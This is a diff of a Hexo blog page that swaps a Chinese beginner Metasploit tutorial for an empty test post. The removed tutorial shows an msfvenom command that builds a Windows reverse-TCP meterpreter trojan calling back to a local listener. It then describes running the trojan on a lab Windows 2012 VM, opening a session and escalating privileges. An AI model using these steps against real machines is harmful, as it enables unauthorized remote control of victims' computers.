@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="“Metasploit”, Hexo">
+    <meta name="keywords" content="ceshi, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>“Metasploit” | Hexo</title>
+    <title>ceshi | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">“Metasploit”</h1>
+                    <h1 class="description center-align post-title">ceshi</h1>
                 </div>
             </div>
         </div>
@@ -442,7 +442,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-08
+                    2020-08-09
                 </div>
                 
 
@@ -458,31 +458,9 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Metasploit基础教程（1）"><a href="#Metasploit基础教程（1）" class="headerlink" title="Metasploit基础教程（1）"></a>Metasploit基础教程（1）</h2><h6 id="如何使用msf来进行控制另一台电脑"><a href="#如何使用msf来进行控制另一台电脑" class="headerlink" title="如何使用msf来进行控制另一台电脑"></a>如何使用msf来进行控制另一台电脑</h6><hr>
-<h3 id="利用msf模块中的msfvenom模块，首先生成-exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。"><a href="#利用msf模块中的msfvenom模块，首先生成-exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。" class="headerlink" title="利用msf模块中的msfvenom模块，首先生成.exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。"></a>利用msf模块中的msfvenom模块，首先生成.exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。</h3><p>我们要准备两台虚拟机：</p>
-<p>kali：<a target="_blank" rel="noopener" href="https://www.kali.org/downloads/">kali官网下载镜像链接</a></p>
-<p>windows 2012：<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">msdn.各种操作系统镜像</a></p>
-<p>![38732ac418889e8a8cb279313b3abf7](C:\Program Files\6\图片\38732ac418889e8a8cb279313b3abf7.png)</p>
-<p>shell中输入：msfvenom –help看看参数配置，这个是生成木马的编译器。</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/a78a330f0bd4bdfe679ebb81dc87cf8.png" alt="a78a330f0bd4bdfe679ebb81dc87cf8"></p>
-<p>shell输入：ifconfig（看看IP地址）</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/1293a049911ab7dbb1e0ff690742d8a.png" alt="1293a049911ab7dbb1e0ff690742d8a"></p>
-<p>shell输入：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f exe &gt; jinitaimei.exe</p>
-<p>（这个命令意思就是通过msfvenom编译器编译一个后门软件，通俗的讲就是生成一个木马。-p 就是对应的端口 LHOST：这个是本地监听地址这就是我们kali地址。监听端口号就是4444 -f ：指定生成一个什么文件 exe：可执行文件  最后生成一个jinitaimei的exe可执行文件 。可以看出生成了一个341字节木马文件）</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/e54d629aca6b7c53539c8db7f8e61b0.png" alt="e54d629aca6b7c53539c8db7f8e61b0"></p>
-<p>我们直接把文件拖到物理机上，然后在物理机中复制到windows 2012系统中</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/Users\Administrator\Desktop\图片\055cb6f098d31ecaf3d7b41ed77df20.png![055cb6f098d31ecaf3d7b41ed77df20](/055cb6f098d31ecaf3d7b41ed77df20.png" alt="055cb6f098d31ecaf3d7b41ed77df20"></p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/e783d86ad4f309774463257d1e4880a.png" alt="e783d86ad4f309774463257d1e4880a"></p>
-<p>kali命令行中输入：msfconsole（可以看到metasploit版本号，攻击模块和辅助模块以及有多少个漏洞我们可以利用等等，我们话不多说，直接开始淦）</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/6de28a69f4c6402628eb6bef4b60a2d.png" alt="6de28a69f4c6402628eb6bef4b60a2d"></p>
-<p>我们直接利用监听模块：</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/03a057d2af7d08a481442feab29fd62.png" alt="03a057d2af7d08a481442feab29fd62"></p>
-<p>现在直接去windows 2012 双击运行一下这边就会回弹一个meterpreter回来</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/83ed59241e6b7290e1c84165537c66b.png" alt="83ed59241e6b7290e1c84165537c66b"></p>
-<p>看看我们现在的权限，直接提权到最高权限。</p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200808160441571.png" alt="image-20200808160441571"></p>
-<p><img src="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.htm/83ed59241e6b7290e1c84165537c66b.png" alt="83ed59241e6b7290e1c84165537c66b"></p>
-<h2 id="ok现在可以直接看肉鸡的windows-2012-电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）"><a href="#ok现在可以直接看肉鸡的windows-2012-电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）" class="headerlink" title="ok现在可以直接看肉鸡的windows 2012 电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）"></a>ok现在可以直接看肉鸡的windows 2012 电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）</h2>
+                <hr>
+<p>![](C:\Program Files\6\source_posts\ceshi\1.jpeg)</p>
+
             </div>
             <hr/>
 
@@ -507,7 +485,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://KiLeter.github.io/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.html">https://KiLeter.github.io/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.html</a>
+                    <a href="https://KiLeter.github.io/2020/08/09/ceshi/">https://KiLeter.github.io/2020/08/09/ceshi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -715,26 +693,26 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.html">
+                <a href="/2020/08/09/ceshi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="“Metasploit”">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="ceshi">
                         
-                        <span class="card-title">“Metasploit”</span>
+                        <span class="card-title">ceshi</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Metasploit基础教程（1）如何使用msf来进行控制另一台电脑
-利用msf模块中的msfvenom模块，首先生成.exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。我们要准备两台虚拟机：
-kali：kali官网下载镜像链接
+                            
+![](C:\Program Files\6\source_posts\ceshi\1.jpeg)
+
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-09
                             </span>
                         <span class="publish-author">
                             
@@ -752,24 +730,23 @@ kali：kali官网下载镜像链接
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/12139.html">
+                <a href="/2020/08/08/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="“Metasploit”">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="“12138”">
                         
-                        <span class="card-title">“Metasploit”</span>
+                        <span class="card-title">“12138”</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Metasploit基础教程（1）如何使用msf来进行控制另一台电脑
-利用msf模块中的msfvenom模块，首先生成.exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。我们要准备两台虚拟机：
-kali：kali官网下载镜像链接
+                            12138的第一篇博客！
+接近什么样的人就会走上什么样的路，穷人会教你如何节衣缩食，小人会教你坑蒙拐骗，牌友只会催你何时打牌，酒友只会催你何时碰杯。人生最大的运气，不是捡了多少钱，也不是中奖，而是有人认可你鼓励你，指引你，帮助你，发现最好的
                         
                     </div>
                     <div class="publish-info">
@@ -784,7 +761,6 @@ kali：kali官网下载镜像链接
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
